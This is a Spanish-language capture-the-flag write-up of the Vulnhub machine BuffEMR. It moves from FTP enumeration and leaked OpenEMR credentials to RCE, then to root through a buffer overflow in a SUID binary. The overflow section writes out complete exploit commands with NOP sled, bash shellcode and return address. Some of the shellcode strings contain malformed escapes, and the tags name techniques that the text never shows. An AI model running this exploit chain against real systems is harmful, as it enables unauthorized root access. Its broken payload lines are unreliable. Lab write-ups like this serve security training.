---
layout: single
title: BuffEMR - Vulnhub
excerpt: ""
date: 15/11/2023
classes: wide
header:
  teaser_home_page: true
  icon: /assets/images/vulnhub.webp

tags:
  - Web enumeration
  - Information Leakage
  - Cracking ZIP file
  - Abusing Tomcat - Creating a malicious WAR file > RCE
  - Cracking Hash md5sum
  - manipulación de librería Python con permisos incorrectos > Privilege Escalation
---


# PortScan
___


```
# Nmap 7.93 scan initiated Wed Nov 15 10:31:08 2023 as: nmap -sCV -p 21,22,80 -oN targeted 192.168.204.162
Nmap scan report for 192.168.204.162
Host is up (0.00033s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    3 0        0            4096 Jun 21  2021 share
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.204.130
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 924cae7b01fe84f95ef7f0da91e47acf (RSA)
|   256 9597ebea5cf826943ca7b6b476c3279c (ECDSA)
|_  256 cb1cd9564f7ac00125cd98f64e232e77 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
MAC Address: 00:0C:29:D6:9E:7A (VMware)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Nov 15 10:31:15 2023 -- 1 IP address (1 host up) scanned in 7.12 seconds
```


# FTP Enumeration
____


Nmap nos reporta qué es posible ingresar como el usuario **"anonymous"** al servicio **FTP** por ende significa que podemos ingresar sin proporcionar contraseña, descubriendo así unos recursos del cual uno es un directorio, así que para descargarlo nos conectamos por FTP con "**LFTP**" para poder descargar este directorio, ya que con **FTP** normal no podemos descargar directorios completos.

1. Para descargar en "**lftp**" usamos
```
mirror [nombre a descargar]
```

![](/assets/images/vulnhub-writeup-buffemr/Pasted image 20231115105408.png)


Qué al abrirlo, vemos qué aparentemente es un código fuente:
![](/assets/images/vulnhub-writeup-buffemr/Pasted image 20231115105501.png)
Viendo que es un código fuente, indagando en internet descubrimos qué "**openEMR**" es un software de medicina, por ahora intento ver algún tipo de credenciales para intentar conectarme **SSH** o si me puede servir más adelante en el servicio web.

Encontrando así estas credenciales:
![](/assets/images/vulnhub-writeup-buffemr/Pasted image 20231115105918.png)

Intenté conectarme por SSH, por no logré nada, igual guardé las credenciales, seguí investigando.. descubriendo también las credenciales del admin de la **DB**.

![](/assets/images/vulnhub-writeup-buffemr/Pasted image 20231115111951.png)

Así qué ahora me interesa ir por el servicio web del :80.


# Enumeración Web
___

![](/assets/images/vulnhub-writeup-buffemr/Pasted image 20231115112048.png)

Descubriendo así que está corriendo un **ubuntu** default, pero con la duda del código fuente que vimos del "**openEMR**"  indico esta ruta en la URL.

![](/assets/images/vulnhub-writeup-buffemr/Pasted image 20231115112152.png)

Descubriendo un sitio web, pruebo a probar aquí las credenciales qué encontré en el código fuente, logrando entrar como el usuario "admin".

Sé me ocurre buscar vulnerabilidades para este servicio, así que busco su versión, para posterior buscar posibles vulnerabilidades.

![](/assets/images/vulnhub-writeup-buffemr/Pasted image 20231115112351.png)


Encontrando este **PoC** en [Exploit-DB](https://www.exploit-db.com/exploits/45161) desde consola con "**searchsploit**", qué podemos podemos llevar a cabo un RCE, entablándonos así una Reverse Shell.

![](/assets/images/vulnhub-writeup-buffemr/Pasted image 20231115115737.png)


Y ya tan sólo quedaría darle tratamiento a la TTY, sino sabemos como [((Mira este tutorial))](https://4uli.github.io/tratamiento-tty/)


# Escalada de Privilegio #1
____

Indagando en la máquina, encontré el siguiente .ZIP.

![](/assets/images/vulnhub-writeup-buffemr/Pasted image 20231115120916.png)

El cual me lo llevo a local para descomprimirlo.

![](Pasted image 20231115121050.png)

Nos pide contraseña, intenté crackearla y no logré obtener nada, así que opté por buscar en el código fuente qué obtuvimos anteriormente del FTP, obteniendo esta credencial en **base64**.

![](/assets/images/vulnhub-writeup-buffemr/Pasted image 20231115121247.png)

La desconvertí y intenté y tampoco pude, pero curiosamente al poner la misma cadena en base64 logré descomprimirlo.

![](/assets/images/vulnhub-writeup-buffemr/Pasted image 20231115121335.png)

Viendo este contenido, que son las credenciales de un usuario válido del sistema.

![](/assets/images/vulnhub-writeup-buffemr/Pasted image 20231115121427.png)

# Escalada de Privilegios #2


Sí buscamos como "**buffemr**" archivos con permisos **SUID**.
```bash
find / -perm -4000 2>/dev/null
```

![](/assets/images/vulnhub-writeup-buffemr/Pasted image 20231115121714.png)

Vemos que tenemos permisos SUID como root en el.

![](/assets/images/vulnhub-writeup-buffemr/Pasted image 20231115121926.png)

Vemos que es un binario de 32bits, y nos pide qué lo ejecutemos con un argumento.
![](/assets/images/vulnhub-writeup-buffemr/Pasted image 20231115122113.png)

así que pruebo a poner un argumento, pero no aparece nada.
![](/assets/images/vulnhub-writeup-buffemr/Pasted image 20231115122147.png)

Por lo qué se me ocurre ver sí presenta algo a la hora de tratar de probar si es vulnerable a Buffer Overflow.
![](/assets/images/vulnhub-writeup-buffemr/Pasted image 20231115122302.png)

Y vemos qué el ejecutable está programado de forma que el input es bien limitado, por ende podemos tratar de llevar a cabo un Buffer Overflow, para ello nos transferimos este binario a local.

Para en local ejecutarlo con "**gdb**" configurado previamente con "**gef**"

![](/assets/images/vulnhub-writeup-buffemr/Pasted image 20231115123154.png)

1. Sobre pasamos el ESP.
```bash
r [Y MUCHAS A's]
```

Hasta que salga esto:
![](/assets/images/vulnhub-writeup-buffemr/Pasted image 20231115123418.png)

2. Averiguamos la longitud de A's que necesitamos ante de escribir el EIP.
```bash
pattern create
```

obteniendo así el payload para identificar la cantidad, nos copiamos este payload, para ahora volver a correr el programa, pero en vez de las A's ponemos el payload.

![](/assets/images/vulnhub-writeup-buffemr/Pasted image 20231115123747.png)

Y para obtener la cantidad exacta de forma automática usamos.
```python
pattern offset $eip
```

![](/assets/images/vulnhub-writeup-buffemr/Pasted image 20231115123958.png)

Es decir, que después de 512 sobre-escribiremos el EIP.

3. Corroboramos qué son 512 para sobre escribir el EIP.
```bash
r $(python3 -c 'print("A"*512 + "B"*4)')
```

![](/assets/images/vulnhub-writeup-buffemr/Pasted image 20231115124231.png)

Como vemos el EIP vale lo qué indicamos nosotros, por ende ya tenemos el control en el EIP.

Sí ahora vemos protecciones del ejecutable.
![](/assets/images/vulnhub-writeup-buffemr/Pasted image 20231115124417.png)

Vemos qué el "**NX**" está desactivado, permitiéndonos así interpretar cualquier tipo de shellcode qué le metamos, en este caso usaremos un shellcode para que nos de una bash con privilegios


Ahora nos vamos a la máquina víctima, y ejecutamos con "gdb" el ejecutable.
```bash
gdb -q /opt/dontexecute
```

1. Ejecutamos el ejecutable con el shellcode.
```bash
r $(python -c 'print "\x90"*479 + "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80" + "B"*4')
```


Indicamos al EIP que apunte a los OP's de NullCode, para que interprete el ShellCode.
```bash
r $(python -c 'print "\x90"*479 + "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\cd\x80" + "\x70\xd6\xff\xff"')
```



Vemos que nos ejecutó el ShellCode, pero esto lo haría en el mismo "gdb" y a nosotros nos interesaría afuera del gdb, por ende salimos.

y ejecutamos el binario así:
```bash
./dontexecute $(python -c 'print "\x90"*479 + "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\89\xe3\x52\x51\x53\x89\xe1\xcd\x80" + "\x70\xd6\xff\xff"')
```


![](/assets/images/vulnhub-writeup-buffemr/Pasted image 20231115131759.png)
Y estaríamos como Root.
